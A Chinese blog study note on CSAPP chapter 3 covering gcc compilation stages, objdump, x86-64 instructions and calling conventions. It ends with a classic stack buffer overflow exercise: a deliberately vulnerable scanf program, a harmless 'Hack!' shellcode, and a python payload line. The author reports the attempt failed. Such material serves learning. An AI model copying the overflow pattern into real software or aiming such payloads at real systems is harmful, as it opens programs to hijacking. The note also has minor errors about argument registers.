---
title: CSAPP 第三章 笔记
date: 2021-08-31 21:41:22
excerpt: CSAPP 第三章的笔记, 包括初级汇编
tags:
- 读书笔记
- CSAPP
---

> CSAPP 采用的是 x64 ATT 汇编, 然而平时用的 IDA 什么的都是 MASM 汇编... 有点头大
> 话说回来, 都会肯定不是坏事... 大概

<!-- @import "[TOC]" {cmd="toc" depthFrom=1 depthTo=6 orderedList=false} -->

<!-- code_chunk_output -->

- [编译 汇编与反汇编](#编译-汇编与反汇编)
  - [编译](#编译)
  - [反汇编](#反汇编)
- [汇编语言 初步](#汇编语言-初步)
  - [数据格式](#数据格式)
  - [关于 LEA 指令](#关于-lea-指令)
  - [条件判断](#条件判断)
    - [CMP 指令](#cmp-指令)
    - [TEST 指令](#test-指令)
  - [switch 的实现](#switch-的实现)
- [调用过程间的数据传递](#调用过程间的数据传递)
  - [缓冲区溢出攻击](#缓冲区溢出攻击)
    - [一个失败的例子](#一个失败的例子)
  - [对抗措施](#对抗措施)

<!-- /code_chunk_output -->

# 编译 汇编与反汇编

## 编译

`gcc -Og -o [output file] [source files]`

包括四个步骤: 预处理, 编译, 汇编, 链接

- **预处理**
  - 把 `#` 开头的预处理指令展开, 比如头文件展开, 宏展开
  - 处理完了也是 `*.c` 或者 `*.cpp`
  - `gcc -E [source files] -o [output file]`
- **编译**
  - 把预处理完的源代码转化成汇编代码
  - 对于 `gcc`, 默认是 ATT 格式, 用 `-masm=intel` 指定采用 Intel 格式
  - `gcc -S <source>.c -o <output>.s`
- **汇编**
  - 把汇编代码转为二进制的目标文件
  - `gcc -c <source>.c -o <output>.o`
- **链接**
  - 将该目标文件与其他目标文件、库文件、启动文件等链接起来生成可执行文件
  - `gcc <object>.o -o <executable>`

## 反汇编

用 `objdump`

- `-d <file(s)>`: 将代码段反汇编
- `-S <file(s)>`: 将代码段反汇编的同时，将反汇编代码与源代码交替显示
  - 编译时需要使用-g- 参数，生成调试信息
- `-C <file(s)>`: 将C++符号名逆向解析
- `-l <file(s)>`: 反汇编代码中插入文件名和行号
- `-j section <file(s)>`: 仅反汇编指定的section

# 汇编语言 初步

## 数据格式

> 为什么一个字是两字节?
>  
> 实际上, 一个字并不一定是两个字节 - 比如 ARM 的 NEON 指令集下, 一个字就是 32 位 (四字节). 但是在 x86/x64 环境下, 一个字规定为两字节, 从 8086 开始就是这样了
> 另外, 一个字节也不一定是 8 位...
>
>Reference: [StackOverflow](https://stackoverflow.com/questions/28066462/how-many-bits-is-a-word)

| 名称 | 长度 (字节) | ATT格式后缀 | MASM中的类型 |
| ---- | ----------- |----------- | ------------ |
| 字节 | 1           | b           | BYTE         |
| 字  | 2           | w           | WORD         |
| 双字 | 4           | l           | DWORD        |
| 四字 | 8           | q           | QWORD        |

## 关于 LEA 指令

`lea` 指令名为 "加载有效地址" (load effective address), 实际上也可以进行简单的四则运算 (利用那些繁杂但必要的寻址方式).

相对于使用多条`add` `sub`指令, 简单的四则运算用 `lea` 显然更便捷 - 这个时候和地址计算就没任何关系了

> 这点坑了我半天

## 条件判断

### CMP 指令

和 `SUB` 进行的运算一样, 但不改变操作数寄存器的值

### TEST 指令

和 `AND` 进行的运算一样, 但不改变操作数寄存器的值

所以 `test %rax, %rax` 这类两个操作数相同的指令可以用来**判断其值的正负**

## switch 的实现

在分支较多且数值较为接近的时候**可能**会采用跳转表

# 调用过程间的数据传递

在 x86-64 中, 前六个参数可以通过寄存器传递, 从左到右顺序为 `rdi rsi rdx rcx r8~r15`

`rbx rbp r12~r15` 为**被调用者保存的寄存器**, 也就是被调用者需要保证在被调用前后这些寄存器的值不变; 其他所有寄存器 (`rbp` 除外) 为调用者保存的寄存器, 也就是说, 被调用者可以修改这些寄存器的值, 因此调用者在调用其他函数前应先由自己保护好它们.

如果参数多于六个 ~~(什么函数会这么写啊...)~~, 剩下的参数按照从左到右的顺序依次压入栈中 (记得保证对齐), 然后再把调用者的返回地址入栈即可.

```plain
     Bottom
     (HIGH)
+---------------+---------+
|               |         v
|  parameters   |     Frame of
|     7~n       |      caller
+---------------+         ^
|  return addr  |         |
+---------------+---------+
|               |         |
|    saved      |         |
|  regesiters   |         |
|  (rbp rbx..)  |         |
|               |
+---------------+         |
|               |         v
|  local vars   |     Frame of
|               |      callee
+---------------+         ^
|               |         |
| para for next |         |
|   function    |         |
|               |         |
+---------------+---------+
      Top
     (LOW)
```

另外, 当参数为数组, 或函数中使用到了参数的地址, 这些参数也会保存在栈中, 例如下图

![demo](20210903234411.png)

> 根据书上的说法, 当参数为结构体时也会将其保存到栈中, 但根据测试对于较为简单的结构体, 编译器仍然会将其保存到寄存器中, 参见 [GodBolt的结果](https://godbolt.org/z/ax8666aGn)

注意, **这些保存到栈中的参数, 和 调用者的返回地址 都属于调用者的栈帧**

## 缓冲区溢出攻击

我们注意到, 返回地址在局部变量的 "上方" (指较高地址的位置), 所以如果我们通过对局部变量进行构造好的且足够长的赋值, 就有可能把返回地址覆盖掉. 这样, 当函数返回时就会跳转到我们指定的地址, 实现控制.

容易想到, 一种简单的溢出是利用 `gets()` 函数没有指定最大长度的漏洞 - 它会一直从标准输入流中读取, 直到遇到回车. 同时, 如果我们能够输入汇编指令的话, 就可以让处理器跳转到我们自己的指令!

我们精心构造的这种输入, 一般被称作 `shellcode`.

### 一个失败的例子

来看下面一段代码.

```c
#include <stdio.h>

int main() {
    char name[64];
    printf("What's your name?");
    scanf("%s", name);
    printf("Hello, %s!\n", name);
    return 0;
}
```

在这里, `scanf` 会接受一个字符串的输入, 并保存到 `name` 中. 如果输入足够长, 那就可以将返回地址覆盖掉. 把它另存为 `victim.c`, 编译一下, 拿 `objdump` 反汇编看看.

```plain
0000000000401156 <main>:
  401156:       f3 0f 1e fa             endbr64 
  40115a:       55                      push   rbp
  40115b:       48 89 e5                mov    rbp,rsp
  40115e:       48 83 ec 40             sub    rsp,0x40
  401162:       48 8d 45 c0             lea    rax,[rbp-0x40]
  401166:       48 89 c6                mov    rsi,rax
  401169:       48 8d 3d 94 0e 00 00    lea    rdi,[rip+0xe94]        # 402004 <_IO_stdin_used+0x4>
  401170:       b8 00 00 00 00          mov    eax,0x0
  401175:       e8 e6 fe ff ff          call   401060 <__isoc99_scanf@plt>
  40117a:       48 8d 45 c0             lea    rax,[rbp-0x40]
  40117e:       48 89 c6                mov    rsi,rax
  401181:       48 8d 3d 7f 0e 00 00    lea    rdi,[rip+0xe7f]        # 402007 <_IO_stdin_used+0x7>
  401188:       b8 00 00 00 00          mov    eax,0x0
  40118d:       e8 be fe ff ff          call   401050 <printf@plt>
  401192:       b8 00 00 00 00          mov    eax,0x0
  401197:       c9                      leave  
  401198:       c3                      ret    
  401199:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
```

可以看到, `sub    rsp,0x40` 这条指令, 为 `name` 数组在栈上开辟了 64 字节大小的空间. 由此我们可以画出栈上的空间分配情况, 如下图

```plain
+--------------+
|     ...      |
+--------------+
|              |
|  return addr |
|              |
+--------------+ <-- RSP should points here before ret
|              |
|   prev rbp   | <-- 8 bytes long
|              |
+--------------+ <-- RBP should points here
|     ...      |
+--------------+
|              |
|   name[64]   |
|              |
+--------------+ <-- RBP-0x40
```

用 `gdb` 调试一下, 确认我们的猜想对不对. 首先, `gdb -q ./victim` 启动调试, 然后 `b *main`, 在 `main` 函数的第一条指令下断点, `r` 开始运行.

![gdb pic](20210904201815.png)

可以看到, 这时 `RSP = 0x7fffffffde58`, 在下一条 `RBP` 入栈后会变为 `de50`. 用 `p &name[0]` 查看 `name` 数组的地址, 发现是 `0x7fffffffde10`. 由此确认, 返回地址与 `name[0]` 之间的长度为 `0x48 == 72` 字节.

接下来构造 `shellcode`, 我们的目标是输出一个字符串 `Hack!`, 写出如下的汇编代码:

```ASM
[section .text]
        global _start

_start:
        jmp END
BEGIN:
        mov rax, 1
        mov rdi, 1
        pop rsi         ; addr of string popped to RSI as arg of syscall
        mov rdx, 5
        syscall

        mov rax, 0x3c
        mov rdi, 0
        syscall
END:
        call BEGIN      ; addr of string pushed into stack
        DB "Hack!"
```

编译 `nasm -f elf64 shell.asm`, 链接 `ld -s -o shell shell.o`, 然后 `objdump -d shell -M intel` 提取二进制的机器码:

```ASM
Disassembly of section .text:

0000000000401000 <.text>:
  401000:       eb 1e                   jmp    0x401020
  401002:       b8 01 00 00 00          mov    eax,0x1
  401007:       bf 01 00 00 00          mov    edi,0x1
  40100c:       5e                      pop    rsi
  40100d:       ba 05 00 00 00          mov    edx,0x5
  401012:       0f 05                   syscall 
  401014:       b8 3c 00 00 00          mov    eax,0x3c
  401019:       bf 00 00 00 00          mov    edi,0x0
  40101e:       0f 05                   syscall 
  401020:       e8 dd ff ff ff          call   0x401002
  401025:       48 61                   rex.W (bad) 
  401027:       63 6b 21                movsxd ebp,DWORD PTR [rbx+0x21]
```

这份 shellcode 的长度只有 42 字节, 因此我们还需要再填充 30 字节的数据, 之后才是用来覆盖返回地址的 `&name[0]`. 因为其中有很多不可打印的字符, 所以我们用 python 把它输出到一个文件, 然后从文件作为输入.

```shell
python -c 'print ("\xeb\x1e\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x05\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xe8\xdd\xff\xff\xff\x48\x61\x63\x6b\x21" + "\xdb"*30 + "\x10\xde\xff\xff\xff\x7f\x00\x00")' > shellcode
```

> 注意小端序

这次尝试以失败告终, 已经确定成功覆盖了栈中之前保存的 `RBP`, 理论上返回地址也已经被覆盖, 但是就是无法跳转, 报告段错误... 看下图的 `EBP` 的值 (为了确定不是 x86-64 的问题, 使用 x86 重新编译了一次, shellcode 也重新写了一份)

![failed-try😭](20210904214722.png)

> 大概是还有保护措施没有关掉......

> 关于 x86 系列栈指针寄存器的演进历史, 参见 [StackOverflow](https://stackoverflow.com/a/31425990/13804105)

## 对抗措施

//TODO
